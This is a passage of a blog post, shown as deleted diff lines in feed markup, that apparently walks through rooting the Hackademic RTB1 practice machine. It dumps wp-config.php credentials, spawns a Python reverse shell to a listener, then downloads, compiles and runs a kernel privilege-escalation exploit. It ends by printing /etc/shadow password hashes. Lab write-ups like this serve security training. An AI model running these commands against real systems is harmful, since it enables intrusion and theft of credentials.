-</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
-</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
-</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
-</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
-</span><span class='line'>saslauth:x:495:488:&ldquo;Saslauthd user&rdquo;:/var/empty/saslauth:/sbin/nologin
-</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
-</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
-</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
-</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
-</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
-</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
-</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
-</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
-</span><span class='line'><span class="c1">// &lt;strong&gt; MySQL settings &lt;/strong&gt; //</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_NAME</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wordpress</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// The name of the database</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_USER</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// Your MySQL username</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_PASSWORD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lz5yedns</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="c1">// &amp;hellip;and password</span>
-</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_HOST</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// 99% chance you won&amp;rsquo;t need to change this value&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="nx">the</span> <span class="nx">prefix</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">have</span> <span class="nx">multiple</span> <span class="nx">blogs</span> <span class="nx">in</span> <span class="nx">a</span> <span class="nx">single</span> <span class="nx">database</span><span class="o">.</span>
-</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>   <span class="c1">// example: &amp;lsquo;wp&lt;/em&gt;&amp;rsquo; or &amp;lsquo;b2&amp;rsquo; or &amp;lsquo;mylogin_&amp;rsquo;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">localize</span> <span class="nx">WordPress</span><span class="o">.</span>  <span class="nx">A</span> <span class="nx">corresponding</span> <span class="nx">MO</span> <span class="nb">file</span> <span class="k">for</span> <span class="nx">the</span>
-</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
-</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &amp;lsquo;de&amp;rsquo;</span>
-</span><span class='line'><span class="c1">// to enable German language support.</span>
-</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">WPLANG</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Stop</span> <span class="nx">editing</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ABSPATH</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nb">dirname</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">FILE</span><span class="o">&lt;/</span><span class="nx">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">-</span><span class="nx">settings</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
-</span><span class='line'>sudo: sorry, you must have a tty to run sudo
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>For privilege escalation, we use the following exploit:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
-</span><span class='line'><span class="c1">//source: &lt;a href=&quot;http://www.vsecurity.com/resources/advisory/20101019-1/&quot;&gt;http://www.vsecurity.com/resources/advisory/20101019-1/&lt;/a&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x64;&amp;#x72;&amp;#111;&amp;#x73;&amp;#101;&amp;#x6e;&amp;#x62;&amp;#101;&amp;#114;&amp;#x67;&amp;#64;&amp;#118;&amp;#x73;&amp;#101;&amp;#x63;&amp;#x75;&amp;#114;&amp;#x69;&amp;#116;&amp;#121;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;&quot;</span><span class="o">&gt;&amp;</span><span class="err">#</span><span class="n">x64</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">111</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x6e</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x62</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x65</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x72</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x67</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">64</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x76</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x73</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">99</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x75</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x72</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">105</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">116</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">121</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x2e</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x63</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x6f</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="n">x6d</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
-</span><span class='line'> <span class="o">*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
-</span><span class='line'> <span class="o">*</span>
-</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget <span class="p">&amp;</span>ndash<span class="p">;</span>no-check-certificate &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.exploit-db.com/download/15285&quot;</span>&gt;https://www.exploit-db.com/download/15285&lt;/a&gt; -O a.c
-</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
-</span><span class='line'>gcc a.c
-</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
-</span><span class='line'>./a.out
-</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
-</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> by Dan Rosenberg
-</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Resolving kernel addresses<span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
-</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
-</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Overwriting security ops<span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Overwriting <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Triggering payload<span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Restoring <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
-</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Got root!
-</span><span class='line'>sh-4.0# id
-</span><span class='line'>id
-</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;sh-4.0# cat /etc/shadow
-</span><span class='line'>cat /etc/shadow
-</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
-</span><span class='line'>bin:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>daemon:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>adm:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>lp:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>sync:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>shutdown:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>halt:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>mail:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>uucp:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>operator:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>games:&lt;em&gt;:14495:0:99999:7:::
-</span><span class='line'>gopher:&lt;/em&gt;:14495:0:99999:7:::
-</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:*:14495:0:99999:7:::&quot;</span>&gt;ftp:*:14495:0:99999:7:::&lt;/a&gt;
-</span><span class='line'>nobody:*:14495:0:99999:7:::
-</span><span class='line'>vcsa:!!:14557::::::
-</span><span class='line'>avahi-autoipd:!!:14557::::::
-</span><span class='line'>ntp:!!:14557::::::
-</span><span class='line'>dbus:!!:14557::::::
-</span><span class='line'>rtkit:!!:14557::::::
-</span><span class='line'>nscd:!!:14557::::::
-</span><span class='line'>tcpdump:!!:14557::::::
-</span><span class='line'>avahi:!!:14557::::::
-</span><span class='line'>haldaemon:!!:14557::::::
-</span><span class='line'>openvpn:!!:14557::::::
-</span><span class='line'>apache:!!:14557::::::
-</span><span class='line'>saslauth:!!:14557::::::
-</span><span class='line'>mailnull:!!:14557::::::
-</span><span class='line'>smmsp:!!:14557::::::
-</span><span class='line'>smolt:!!:14557::::::
-</span><span class='line'>sshd:!!:14557::::::
-</span><span class='line'>pulse:!!:14557::::::
-</span><span class='line'>gdm:!!:14557::::::
-</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
-</span><span class='line'>mysql:!!:14981::::::
-</span></code></pre></td></tr></table></div></figure></p>
 ]]></content>
   </entry>
   
